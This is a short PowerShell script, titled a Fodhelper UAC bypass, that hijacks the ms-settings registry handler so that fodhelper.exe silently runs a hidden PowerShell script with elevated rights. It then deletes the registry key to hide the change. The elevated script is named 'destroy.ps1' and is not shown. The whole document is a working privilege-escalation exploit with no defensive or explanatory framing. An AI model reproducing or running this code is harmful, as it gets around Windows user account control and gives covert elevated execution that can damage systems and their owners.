# Fodhelper UAC Bypass
$regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
New-Item $regPath -Force
New-ItemProperty $regPath -Name "DelegateExecute" -Value $null -Force
New-ItemProperty $regPath -Name "(Default)" -Value 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Windows\Temp\destroy.ps1"' -Force

# Start fodhelper
Start-Process "fodhelper.exe"

# Wacht 3 sec, ruim op
Start-Sleep -Seconds 3
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force